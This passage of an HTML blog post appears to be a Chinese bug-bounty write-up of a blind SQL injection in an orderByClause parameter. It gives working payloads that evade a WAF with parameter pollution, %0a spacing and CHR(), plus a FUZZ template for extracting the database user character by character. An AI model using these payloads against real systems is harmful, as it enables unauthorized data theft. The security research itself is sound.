class="hljs-operator">=</span>(<span class="hljs-keyword">case</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>aSUBSTRB(<span class="hljs-keyword">USER</span><span class="hljs-operator">&amp;</span>orderByClause<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>orderByClause<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-operator">%</span><span class="hljs-number">0</span>awhen<span class="hljs-operator">%</span><span class="hljs-number">0</span>a1<span class="hljs-operator">%</span><span class="hljs-number">0</span>athen<span class="hljs-operator">%</span><span class="hljs-number">0</span>aexp(<span class="hljs-number">900</span>)<span class="hljs-operator">%</span><span class="hljs-number">0</span>aelse<span class="hljs-operator">%</span><span class="hljs-number">0</span>aPROVINCE_ID<span class="hljs-operator">%</span><span class="hljs-number">0</span>aend)<span class="hljs-operator">%</span><span class="hljs-number">0</span>aasc # 参数污染绕过逗号,<span class="hljs-operator">%</span><span class="hljs-number">0</span>a绕过空格<br></code></pre></td></tr></table></figure>
+
+<p>绕过逗号后，结果提示数据类型应该是字符串</p>
+<p><img src="https://s2.loli.net/2024/11/10/RtsIKBxzGdfb4LO.png" srcset="/img/loading.gif" lazyload alt="image-20241110225027275"></p>
+<p>只有这个截取函数会返回数据类型不一致，说明when后面的应为字符串</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">case</span> SUBSTRB(<span class="hljs-keyword">USER</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">when</span> <span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">900</span>) <span class="hljs-keyword">else</span> PROVINCE_ID <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/xGToFHhZwaDUQJ4.png" srcset="/img/loading.gif" lazyload alt="image-20241110224539629"></p>
+<p>尝试直接换成 when ‘a’ 也不行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">case</span> SUBSTRB(<span class="hljs-keyword">USER</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">900</span>) <span class="hljs-keyword">else</span> PROVINCE_ID <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/ECzOSb6c7rujq2s.png" srcset="/img/loading.gif" lazyload alt="image-20241110224647800"></p>
+<p>于是使用chr()函数绕过，when后面不能接普通字符的限制</p>
+<p>用CHR(50)代替一下，就是将ascii码为50转成字符串，原始paylaod为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">case</span> SUBSTR(<span class="hljs-keyword">USER</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">when</span> CHR(<span class="hljs-number">50</span>) <span class="hljs-keyword">then</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">900</span>) <span class="hljs-keyword">else</span> PROVINCE_ID <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span><br></code></pre></td></tr></table></figure>
+
+<p>截取的第一位字符肯定不等于CHR(50)，会返回按照PROVINCE_ID排序的数据，回显正常</p>
+<p><img src="https://s2.loli.net/2024/11/10/DAlEoqpO1YBPWx4.png" srcset="/img/loading.gif" lazyload alt="image-20241110225550998"></p>
+<p>直接跑第一位，遍历CHR里面的数字，第一位ascii码为88，也就是X</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">case</span> SUBSTR(<span class="hljs-keyword">USER</span>,【FUZZ】,<span class="hljs-number">1</span>) <span class="hljs-keyword">when</span> CHR(【FUZZ】) <span class="hljs-keyword">then</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">900</span>) <span class="hljs-keyword">else</span> PROVINCE_ID <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span><br><br>orderByClause<span class="hljs-operator">=</span>(<span class="hljs-keyword">case</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>aSUBSTRB(<span class="hljs-keyword">USER</span><span class="hljs-operator">&amp;</span>orderByClause<span class="hljs-operator">=</span>【FUZZ】<span class="hljs-operator">&amp;</span>orderByClause<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-operator">%</span><span class="hljs-number">0</span>awhen<span class="hljs-operator">%</span><span class="hljs-number">0</span>aCHR(【FUZZ】)<span class="hljs-operator">%</span><span class="hljs-number">0</span>athen<span class="hljs-operator">%</span><span class="hljs-number">0</span>aexp(<span class="hljs-number">900</span>)<span class="hljs-operator">%</span><span class="hljs-number">0</span>aelse<span class="hljs-operator">%</span><span class="hljs-number">0</span>aPROVINCE_ID<span class="hljs-operator">%</span><span class="hljs-number">0</span>aend)<span class="hljs-operator">%</span><span class="hljs-number">0</span>aasc # 参数污染绕过逗号,<span class="hljs-operator">%</span><span class="hljs-number">0</span>a绕过空格<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/dVoFjKykP21em3U.png" srcset="/img/loading.gif" lazyload alt="image-20241110231032579"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/SRC%E6%8C%96%E6%8E%98%E6%A1%88%E4%BE%8B/" class="category-chain-item">SRC挖掘案例</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%87%A0%E4%B8%AAsql%E6%B3%A8%E5%85%A5%E7%BB%95WAF%E6%A1%88%E4%BE%8B/" class="print-no-link">#几个sql注入绕WAF案例</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/23/%E6%8E%A2%E7%A9%B6%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E4%B8%ADgbk%E7%BC%96%E7%A0%81%E5%88%B0%E5%BA%95%E6%98%AF%E6%8C%87%E8%B0%81%E7%9A%84%EF%BC%9F/" title="探究：宽字节注入中gbk编码到底是指谁的？">
+                        <span class="hidden-mobile">探究：宽字节注入中gbk编码到底是指谁的？</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"f0DHnqSCglihztWD5hnI8OS8-gzGzoHsz","appKey":"M3h6WgzFRHqbQjc4e8jWn6Ix","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
